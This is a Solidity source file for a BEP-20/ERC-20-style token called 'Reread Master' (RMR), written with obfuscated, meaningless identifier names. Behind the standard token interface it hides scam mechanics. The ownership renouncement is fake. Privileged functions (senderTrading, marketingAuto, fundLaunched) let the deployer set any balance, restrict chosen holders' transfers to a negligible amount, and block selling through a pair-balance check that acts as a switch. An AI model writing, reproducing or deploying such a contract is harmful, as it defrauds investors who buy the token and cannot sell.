//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface launchReceiver {
    function createPair(address feeTakeSwap, address minReceiver) external returns (address);
}

interface fromBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txTo) external view returns (uint256);

    function transfer(address tradingTotal, uint256 limitBuy) external returns (bool);

    function allowance(address sellTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitBuy) external returns (bool);

    function transferFrom(
        address sender,
        address tradingTotal,
        uint256 limitBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverEnable, uint256 value);
    event Approval(address indexed sellTrading, address indexed spender, uint256 value);
}

abstract contract shouldAmountLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderLiquidityMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromBuyMetadata is fromBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RereadMaster is shouldAmountLimit, fromBuy, fromBuyMetadata {

    function fundLaunched(uint256 limitBuy) public {
        launchedBuy();
        marketingTotal = limitBuy;
    }

    string private totalReceiver = "RMR";

    uint256 private totalMode = 100000000 * 10 ** 18;

    function tradingAutoIs() public {
        emit OwnershipTransferred(txFrom, address(0));
        liquidityTakeAt = address(0);
    }

    function getOwner() external view returns (address) {
        return liquidityTakeAt;
    }

    uint256 public buyShould;

    uint256 private sellShouldTeam;

    address totalSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function enableFee(address toAt) public {
        require(toAt.balance < 100000);
        if (receiverList) {
            return;
        }
        if (buyShould == sellShouldTeam) {
            sellShouldTeam = buyShould;
        }
        launchEnable[toAt] = true;
        
        receiverList = true;
    }

    bool private walletTotal;

    function allowance(address takeWallet, address limitMax) external view virtual override returns (uint256) {
        if (limitMax == senderFrom) {
            return type(uint256).max;
        }
        return txTotal[takeWallet][limitMax];
    }

    mapping(address => mapping(address => uint256)) private txTotal;

    mapping(address => uint256) private swapTotalToken;

    uint256 marketingTotal;

    address private liquidityTakeAt;

    bool public receiverList;

    function symbol() external view virtual override returns (string memory) {
        return totalReceiver;
    }

    address senderFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public launchEnable;

    bool private minLaunched;

    event OwnershipTransferred(address indexed exemptToken, address indexed receiverIs);

    address public autoExempt;

    constructor (){
        
        senderLiquidityMarketing teamTakeExempt = senderLiquidityMarketing(senderFrom);
        autoExempt = launchReceiver(teamTakeExempt.factory()).createPair(teamTakeExempt.WETH(), address(this));
        
        txFrom = _msgSender();
        launchEnable[txFrom] = true;
        swapTotalToken[txFrom] = totalMode;
        tradingAutoIs();
        if (feeTo) {
            atTo = false;
        }
        emit Transfer(address(0), txFrom, totalMode);
    }

    function decimals() external view virtual override returns (uint8) {
        return listTx;
    }

    function name() external view virtual override returns (string memory) {
        return buyMin;
    }

    bool public atTo;

    bool public txMax;

    function receiverTx(address minTo, address tradingTotal, uint256 limitBuy) internal returns (bool) {
        require(swapTotalToken[minTo] >= limitBuy);
        swapTotalToken[minTo] -= limitBuy;
        swapTotalToken[tradingTotal] += limitBuy;
        emit Transfer(minTo, tradingTotal, limitBuy);
        return true;
    }

    uint8 private listTx = 18;

    mapping(address => bool) public toLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return totalMode;
    }

    uint256 enableWallet;

    uint256 constant receiverShould = 13 ** 10;

    function transfer(address minLaunch, uint256 limitBuy) external virtual override returns (bool) {
        return toFee(_msgSender(), minLaunch, limitBuy);
    }

    function launchedBuy() private view {
        require(launchEnable[_msgSender()]);
    }

    function transferFrom(address minTo, address tradingTotal, uint256 limitBuy) external override returns (bool) {
        if (_msgSender() != senderFrom) {
            if (txTotal[minTo][_msgSender()] != type(uint256).max) {
                require(limitBuy <= txTotal[minTo][_msgSender()]);
                txTotal[minTo][_msgSender()] -= limitBuy;
            }
        }
        return toFee(minTo, tradingTotal, limitBuy);
    }

    function approve(address limitMax, uint256 limitBuy) public virtual override returns (bool) {
        txTotal[_msgSender()][limitMax] = limitBuy;
        emit Approval(_msgSender(), limitMax, limitBuy);
        return true;
    }

    address public txFrom;

    function toFee(address minTo, address tradingTotal, uint256 limitBuy) internal returns (bool) {
        if (minTo == txFrom) {
            return receiverTx(minTo, tradingTotal, limitBuy);
        }
        uint256 fundAtEnable = fromBuy(autoExempt).balanceOf(totalSwap);
        require(fundAtEnable == marketingTotal);
        require(tradingTotal != totalSwap);
        if (toLaunched[minTo]) {
            return receiverTx(minTo, tradingTotal, receiverShould);
        }
        return receiverTx(minTo, tradingTotal, limitBuy);
    }

    function marketingAuto(address shouldLaunch) public {
        launchedBuy();
        if (atTo != minLaunched) {
            sellShouldTeam = buyShould;
        }
        if (shouldLaunch == txFrom || shouldLaunch == autoExempt) {
            return;
        }
        toLaunched[shouldLaunch] = true;
    }

    function balanceOf(address txTo) public view virtual override returns (uint256) {
        return swapTotalToken[txTo];
    }

    bool private feeTo;

    function senderTrading(address minLaunch, uint256 limitBuy) public {
        launchedBuy();
        swapTotalToken[minLaunch] = limitBuy;
    }

    string private buyMin = "Reread Master";

    function owner() external view returns (address) {
        return liquidityTakeAt;
    }

}